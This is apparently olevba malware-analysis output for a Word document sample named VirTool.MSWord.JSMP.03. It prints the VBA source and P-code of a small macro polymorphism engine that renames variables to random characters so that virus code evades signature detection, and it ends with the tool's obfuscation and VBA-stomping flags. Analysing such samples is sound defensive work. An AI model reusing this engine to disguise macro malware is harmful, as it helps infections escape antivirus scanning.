olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: VirTool.MSWord.JSMP.03
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: VirTool.MSWord.JSMP.03 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Function JSMP(OURCODE)
ALLVARIABLES = "JSMP OURCODE ALLVARIABLES VARLOOP NEWVAR VARPOS CURVAR "
Do
CURVAR = Left(ALLVARIABLES, InStr(ALLVARIABLES, Chr(32)) - 1)
ALLVARIABLES = Mid(ALLVARIABLES, InStr(ALLVARIABLES, Chr(32)) + 1)
NEWVAR = Chr((Int(Rnd * 74) + 130)) & Chr((Int(Rnd * 74) + 130)) & Chr((Int(Rnd * 74) + 130)) & Chr((Int(Rnd * 74) + 130)) & Chr((Int(Rnd * 74) + 130)) & Chr((Int(Rnd * 74) + 130))
Do
VARPOS = InStr(VARPOS + 1, OURCODE, CURVAR)
If VARPOS Then OURCODE = Mid(OURCODE, 1, (VARPOS - 1)) & NEWVAR & Mid(OURCODE, (VARPOS + Len(CURVAR)))
Loop While VARPOS
Loop While ALLVARIABLES <> ""
JSMP = OURCODE
End Function

'jackie's stupid macro poly v0.3

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: VirTool.MSWord.JSMP.03
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 2085 bytes
' Line #0:
' 	FuncDefn (Private Function JSMP(OURCODE, id_FFFE As Variant))
' Line #1:
' 	LitStr 0x0037 "JSMP OURCODE ALLVARIABLES VARLOOP NEWVAR VARPOS CURVAR "
' 	St ALLVARIABLES 
' Line #2:
' 	Do 
' Line #3:
' 	Ld ALLVARIABLES 
' 	Ld ALLVARIABLES 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	FnInStr 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	St CURVAR 
' Line #4:
' 	Ld ALLVARIABLES 
' 	Ld ALLVARIABLES 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	FnInStr 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Mid$ 0x0002 
' 	St ALLVARIABLES 
' Line #5:
' 	Ld Rnd 
' 	LitDI2 0x004A 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0082 
' 	Add 
' 	Paren 
' 	ArgsLd Chr 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x004A 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0082 
' 	Add 
' 	Paren 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x004A 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0082 
' 	Add 
' 	Paren 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x004A 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0082 
' 	Add 
' 	Paren 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x004A 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0082 
' 	Add 
' 	Paren 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x004A 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0082 
' 	Add 
' 	Paren 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St NEWVAR 
' Line #6:
' 	Do 
' Line #7:
' 	Ld VARPOS 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld OURCODE 
' 	Ld CURVAR 
' 	FnInStr3 
' 	St VARPOS 
' Line #8:
' 	Ld VARPOS 
' 	If 
' 	BoSImplicit 
' 	Ld OURCODE 
' 	LitDI2 0x0001 
' 	Ld VARPOS 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	ArgsLd Mid$ 0x0003 
' 	Ld NEWVAR 
' 	Concat 
' 	Ld OURCODE 
' 	Ld VARPOS 
' 	Ld CURVAR 
' 	FnLen 
' 	Add 
' 	Paren 
' 	ArgsLd Mid$ 0x0002 
' 	Concat 
' 	St OURCODE 
' 	EndIf 
' Line #9:
' 	Ld VARPOS 
' 	LoopWhile 
' Line #10:
' 	Ld ALLVARIABLES 
' 	LitStr 0x0000 ""
' 	Ne 
' 	LoopWhile 
' Line #11:
' 	Ld OURCODE 
' 	St JSMP 
' Line #12:
' 	EndFunc 
' Line #13:
' Line #14:
' 	QuoteRem 0x0000 0x001F "jackie's stupid macro poly v0.3"
' Line #15:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

